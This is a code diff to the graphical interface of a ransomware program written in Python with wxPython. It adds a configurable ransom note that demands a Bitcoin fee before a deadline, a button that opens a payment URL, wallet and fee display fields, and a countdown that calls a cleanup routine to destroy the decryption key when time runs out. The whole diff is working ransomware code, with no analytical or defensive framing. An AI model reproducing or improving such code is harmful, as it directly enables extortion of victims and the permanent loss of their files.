@@ -8,6 +8,7 @@
 import wx
 import os
 import time
+import webbrowser
 
 # Threading imports
 from threading import Thread, Event
@@ -119,17 +120,19 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 	labels, text, buttons, images etc. Also inherits from main Base for schema
 	'''
 	
-	def __init__( self, image_path, start_time, decrypter ):
+	def __init__( self, image_path, start_time, decrypter, config):
 		'''
 		@summary: Constructor
 		@param image_path: The path to look at to find resources, such as images.
 		@param start_time: EPOCH time that the encryption finished.
 		@param decrypter: Handle back to Main. For calling decryption method
+		@param config: The ransomware's runtime config dict
 		'''
 		# Handle Params
 		self.image_path = image_path
 		self.start_time = start_time
 		self.decrypter = decrypter
+		self.__config = config
 		self.decryption_thread = None
 		self.decryption_dialog = None
 		self.encrypted_files_list = self.decrypter.get_encrypted_files_list()
@@ -137,6 +140,18 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		
 		# Define other vars
 		self.set_message_to_null = True
+		self.GUI_RANSOM_MESSAGE = (
+			"The important files on your computer have been encrypted with"
+            " military grade AES-256 bit encryption.\n\nYour documents, videos"
+            " images and other forms of data are now inaccessible, and cannot"
+          	" be unlocked without the decryption key. This key is currently"
+          	" being stored on a remote server.\n\nTo acquire this key, transfer"
+          	" a total of %s BTC to the Bitcoin wallet address below within %s"
+          	" hours.\n\nIf you fail to take action within this time window,"
+          	" the decryption key will be destroyed and access to your files"
+          	" will be permanently lost." % 
+          	(self.__config["bitcoin_fee"], (int(self.__config["key_destruction_time"]) / 60 / 60))
+          	)
 		
 		# Super
 		MainFrame.__init__( self, parent=None )
@@ -196,10 +211,19 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		  self.key_destruction_timer.Stop()
 		  self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_DECRYPTED[self.LANG])
 		  self.FlashingMessageText.SetForegroundColour( wx.Colour(2, 217, 5) )
-		  self.KeyDestructionTime.SetLabelText(self.GUI_LABEL_TEXT_FILES_DECRYPTED[self.LANG])
-		  self.KeyDestructionTime.SetForegroundColour( wx.Colour(2, 217, 5) )
-		  # Disable decryption dialog button
+		  self.TimeRemainingTime.SetLabelText(self.GUI_LABEL_TEXT_TIME_BLANK[self.LANG])
+		  
+		  # Disable decryption and files list buttons
 		  self.EnterDecryptionKeyButton.Disable()
+		  self.ViewEncryptedFilesButton.Disable()
+		  
+		  
+	def open_url(self, event):
+		'''
+		@summary: Opens a web browser at the Bitcoin URL
+		'''
+		
+		webbrowser.open(self.BTC_BUTTON_URL)
 		
 
 	def set_events(self):
@@ -216,6 +240,7 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		# Create button events
 		self.Bind(wx.EVT_BUTTON, self.show_encrypted_files, self.ViewEncryptedFilesButton)
 		self.Bind(wx.EVT_BUTTON, self.show_decryption_dialog, self.EnterDecryptionKeyButton)
+		self.Bind(wx.EVT_BUTTON, self.open_url, self.BitcoinButton)
 		
 	
 	def stop_decryption(self, event):
@@ -309,29 +334,34 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		'''
 		@summary: Blinks the subheader text
 		'''
-		
-		# Set message to blank
-		if self.set_message_to_null:
-			self.FlashingMessageText.SetLabelText("")
-			self.set_message_to_null = False
-		# Set message to text
-		else:
-			self.FlashingMessageText.SetLabelText(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED[self.LANG])
-			self.set_message_to_null = True
-		
+
 		# Update the time remaining
 		time_remaining = self.get_time_remaining()
 		
+		# Set message to blank
+		if self.set_message_to_null and time_remaining:
+			self.FlashingMessageText.SetLabelText("")
+			self.set_message_to_null = False
+		# Set message to text
+		elif time_remaining:
+			self.FlashingMessageText.SetLabelText(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED[self.LANG])
+			self.set_message_to_null = True
+		
 		# If the key has been destroyed, update the menu text
 		if not time_remaining:
-			self.KeyDestructionTime.SetLabelText(self.GUI_LABEL_TEXT_KEY_DESTROYED[self.LANG])
-			# Set timer colour to black
-			self.KeyDestructionTime.SetForegroundColour( wx.SystemSettings_GetColour(
-				wx.SYS_COLOUR_CAPTIONTEXT))
+		  	# Cleanup decrypter and change dialog message
+		  	self.decrypter.cleanup()
+		  	# Update main window
+		  	self.key_destruction_timer.Stop()
+			self.TimeRemainingTime.SetLabelText(self.GUI_LABEL_TEXT_TIME_BLANK[self.LANG])
+			self.FlashingMessageText.SetLabelText(self.GUI_LABEL_TEXT_FLASHING_DESTROYED[self.LANG])
+		  	self.FlashingMessageText.SetForegroundColour( wx.Colour(0, 0, 0) )
 			# Disable decryption button
-			#self.EnterDecryptionKeyButton.Disable()
+			self.EnterDecryptionKeyButton.Disable()
+			self.ViewEncryptedFilesButton.Disable()
+			self.HeaderPanel.Layout() # Recenters the child widgets after text update (this works!)
 		else:
-			self.KeyDestructionTime.SetLabelText(time_remaining)
+			self.TimeRemainingTime.SetLabelText(time_remaining)
 		
 		
 	def get_time_remaining(self):
@@ -343,14 +373,14 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		
 		seconds_elapsed = int(time.time() - int(self.start_time))
 		
-		_time_remaining = self.KEY_DESTRUCT_TIME_SECONDS - seconds_elapsed
+		_time_remaining = int(self.__config["key_destruction_time"]) - seconds_elapsed
 		if _time_remaining <= 0:
 			return None
 		
 		minutes, seconds = divmod(_time_remaining, 60)
 		hours, minutes = divmod(minutes, 60)
 		
-		return "%d:%02d:%02d" % (hours, minutes, seconds)
+		return "%02d:%02d:%02d" % (hours, minutes, seconds)
 		
 		
 	def update_visuals(self):
@@ -370,7 +400,7 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED[self.LANG])
 		
 		# Set Ransom Message
-		self.RansomNoteText.SetValue(self.GUI_RANSOM_MESSAGE[self.LANG])
+		self.RansomNoteText.SetValue(self.GUI_RANSOM_MESSAGE)
 
 		# Set Logo
 		self.LockBitmap.SetBitmap(
@@ -379,13 +409,19 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 				wx.BITMAP_TYPE_ANY))
 
 		# Set key destruction label
-		self.KeyDestructionLabel.SetLabel(self.GUI_LABEL_TEXT_KEY_DESTRUCTION[self.LANG])
+		self.TimeRemainingLabel.SetLabel(self.GUI_LABEL_TEXT_TIME_REMAINING[self.LANG])
 
 		# Set Wallet Address label
 		self.WalletAddressLabel.SetLabel(self.GUI_LABEL_TEXT_WALLET_ADDRESS[self.LANG])
 		
 		# Set Wallet Address Value
-		self.WalletAddressString.SetLabel(self.WALLET_ADDRESS)
+		self.WalletAddressString.SetLabel(self.__config["wallet_address"])
+
+		# Set Bitcoin Fee label
+		self.BitcoinFeeLabel.SetLabel(self.GUI_LABEL_TEXT_BITCOIN_FEE[self.LANG])
+
+		# Set Bitcoin Fee Value
+		self.BitcoinFeeString.SetLabel(self.__config["bitcoin_fee"])
 
 		# Set Button Text
 		self.ViewEncryptedFilesButton.SetLabel(self.GUI_BUTTON_TEXT_VIEW_ENCRYPTED_FILES[self.LANG])
